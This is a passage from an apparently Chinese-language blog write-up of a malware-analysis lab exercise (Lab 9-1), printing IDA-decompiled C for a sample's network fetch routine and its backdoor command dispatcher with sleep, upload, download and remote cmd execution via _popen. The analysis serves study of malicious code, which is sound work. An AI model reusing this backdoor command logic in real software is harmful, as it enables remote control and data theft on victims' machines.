class="type">char</span> *)a3);</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;buf, aHttp1_0);</span><br><span class="line">  <span class="keyword">if</span> ( send(s, &amp;buf, <span class="built_in">strlen</span>(&amp;buf), <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    closesocket(s);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = recv(s, &amp;v6, <span class="number">512</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401740(&amp;s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v10 + v8) &gt; *(_DWORD *)a5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401740(&amp;s);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    qmemcpy(&amp;a4[v8], &amp;v6, v10);</span><br><span class="line">    v8 += v10;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a4, asc_40C068) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">if</span> ( sub_401740(&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)a5 = v8;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>纵观以上，可以得到401e60主要功能为以下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _cdecl <span class="title function_">sub_401E60</span><span class="params">(cahr *a1,<span class="type">signed</span> <span class="type">int</span> a2)</span>&#123;</span><br><span class="line">    <span class="type">signed</span> <span class="type">int</span> result;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(sub_401420(...))&#123;    <span class="comment">// 获取注册表键并截取</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401470(...))&#123;    <span class="comment">// 获取注册表键</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401D80(...))&#123;    <span class="comment">// 无聊的延时</span></span><br><span class="line">        resutl = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401AF0(...))&#123;    <span class="comment">// 网络Get和recv</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a = <span class="built_in">strstr</span>(...))&#123;    <span class="comment">// 字符串匹配</span></span><br><span class="line">            <span class="keyword">if</span>(b = <span class="built_in">strstr</span>(...))&#123;</span><br><span class="line">                <span class="keyword">if</span>(b - a + <span class="number">1</span> &lt;= a2)&#123;</span><br><span class="line">                    <span class="built_in">memcpy</span>(a1 , ...);    <span class="comment">// 复制</span></span><br><span class="line">                    a1[...] = <span class="number">0</span>;</span><br><span class="line">                    result = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    result = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                result = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果获取字符串成功，则进入40204C，可以看到类似于一个后门功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402020</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// ST2C_4@4</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ST30_4@4</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// eax@6</span></span><br><span class="line">  u_short v5; <span class="comment">// ST24_2@6</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// ST28_4@6</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// eax@10</span></span><br><span class="line">  u_short v8; <span class="comment">// ST1C_2@10</span></span><br><span class="line">  <span class="type">char</span> *lpFileName; <span class="comment">// ST20_4@10</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// eax@14</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// ST18_4@14</span></span><br><span class="line">  u_short hostshort; <span class="comment">// [sp+4h] [bp-424h]@14</span></span><br><span class="line">  FILE *v13; <span class="comment">// [sp+8h] [bp-420h]@14</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [sp+28h] [bp-400h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_401E60(&amp;v14, <span class="number">1024</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aSleep, <span class="built_in">strlen</span>(aSleep)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v2 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v3 = atoi(v2);</span><br><span class="line">    Sleep(<span class="number">1000</span> * v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aUpload, <span class="built_in">strlen</span>(aUpload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v5 = atoi(v4);</span><br><span class="line">    v6 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    <span class="keyword">if</span> ( sub_4019E0(name, v5, v6) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aDownload, <span class="built_in">strlen</span>(aDownload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v7 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v8 = atoi(v7);</span><br><span class="line">    lpFileName = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401870(name, v8, lpFileName) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aCmd, <span class="built_in">strlen</span>(aCmd)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v10 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    hostshort = atoi(v10);</span><br><span class="line">    v11 = strtok(<span class="number">0</span>, asc_40C0A4);</span><br><span class="line">    v13 = _popen(v11, aRb);</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401790(name, hostshort, v13) )</span><br><span class="line">    &#123;</span><br><span class="line">      _pclose(v13);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _pclose(v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncmp</span>(&amp;v14, aNothing, <span class="built_in">strlen</span>(aNothing));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220826092049031.png" alt="image-20220826092049031"> </p>
+<p>可以实现cmd，和upload</p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">John Doe</a>
+            <p>Link：<a href="http://example.com/2022/08/06/lab9-1/">http://example.com/2022/08/06/lab9-1/</a>
+            <p>Publish date：<a href="http://example.com/2022/08/06/lab9-1/">August 6th 2022, 9:16:50 pm</a>
+            <p>Update date：<a href="http://example.com/2022/08/06/lab9-1/">September 1st 2022, 8:42:06 am</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/09/01/shiro/" title="">
+                    <div class="nextTitle">[Untitled Post]</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" title="Fastjson 反序列化漏洞">
+                    <div class="prevTitle">Fastjson 反序列化漏洞</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:1611249603@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/s1eep1234" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                    
+                    <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:30vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%B5%E8%A7%82"><span class="toc-number">1.</span> <span class="toc-text">纵观</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">详细分析</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span>
+            <a class="archive-post-title" href="/2022/09/01/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span>
+            <a class="archive-post-title" href="/2022/09/01/shiro/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span>
+            <a class="archive-post-title" href="/2022/09/01/urldns/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span>
+            <a class="archive-post-title" href="/2022/08/06/lab9-1/">恶意代码分析lab9-1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">Fastjson 反序列化漏洞</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="java安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                java安全
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="恶意代码">
+                <span class="iconfont-archer">&#xe606;</span>
+                恶意代码
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="二进制">
+                <span class="iconfont-archer">&#xe606;</span>
+                二进制
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="java安全">
+            <span class="iconfont-archer">&#xe60a;</span>
+            java安全
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="恶意代码">
+            <span class="iconfont-archer">&#xe60a;</span>
+            恶意代码
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
